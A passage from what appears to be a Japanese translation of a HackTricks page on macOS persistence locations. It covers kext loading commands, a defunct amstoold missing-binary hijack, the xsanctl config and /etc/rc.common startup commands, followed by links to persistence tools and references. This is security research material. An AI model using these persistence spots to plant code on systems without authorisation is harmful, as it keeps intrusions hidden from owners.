現在ロードされている kext ファイルは、次のコマンドで一覧表示できます:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
詳細については、[**kernel extensions についてはこちらのセクションを確認してください**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- Root required

#### Description & Exploitation

どうやら `/System/Library/LaunchAgents/com.apple.amstoold.plist` の `plist` は XPC service を公開しながらこの binary を使用していたようです……問題は binary が存在しなかったため、そこに何かを配置すれば、XPC service が呼び出されたときに自分の binary が呼び出される可能性がありました。<sup>[35]</sup>

現在の macOS では、もうこれを見つけることができません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Trigger**: service が実行されたとき（まれ）

#### Description & exploit

この script が実行されることはあまり一般的ではないようで、私の macOS でも見つけることができませんでした。そのため、詳しい情報が必要な場合は writeup を確認してください。<sup>[36]</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **これは最新の MacOS バージョンでは動作しません**

ここに**startup 時に実行される commands**を配置することも可能です。通常の rc.common script の例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques とツール

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## 参考資料

- [1] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [昔ながらのLaunchAgentsを超えて - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [昔ながらのLaunchAgentsを超えて - 18 - X11とXQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [昔ながらのLaunchAgentsを超えて - 21 - 再オープンされたApplications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [昔ながらのLaunchAgentsを超えて - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [昔ながらのLaunchAgentsを超えて - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [昔ながらのLaunchAgentsを超えて - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [昔ながらのLaunchAgentsを超えて - 22 - LoginHookとLogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [昔ながらのLaunchAgentsを超えて - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [昔ながらのLaunchAgentsを超えて - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [昔ながらのLaunchAgentsを超えて - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [昔ながらのLaunchAgentsを超えて - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [昔ながらのLaunchAgentsを超えて - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [昔ながらのLaunchAgentsを超えて - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [昔ながらのLaunchAgentsを超えて - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [昔ながらのLaunchAgentsを超えて - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOSでのPersistenceのためのFolder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [昔ながらのLaunchAgentsを超えて - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [昔ながらのLaunchAgentsを超えて - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [昔ながらのLaunchAgentsを超えて - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [「Mac File Opener」のPersistenceを分析する (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [昔ながらのLaunchAgentsを超えて - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Accessを維持する: macOS PersistenceのためのScreensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [昔ながらのLaunchAgentsを超えて - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [昔ながらのLaunchAgentsを超えて - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [昔ながらのLaunchAgentsを超えて - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [昔ながらのLaunchAgentsを超えて - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [昔ながらのLaunchAgentsを超えて - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization PluginsによるPersistent Credential Theft (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [昔ながらのLaunchAgentsを超えて - 30 - man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [昔ながらのLaunchAgentsを超えて - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [昔ながらのLaunchAgentsを超えて - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [昔ながらのLaunchAgentsを超えて - 23 - emond、The Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [昔ながらのLaunchAgentsを超えて - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [昔ながらのLaunchAgentsを超えて - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
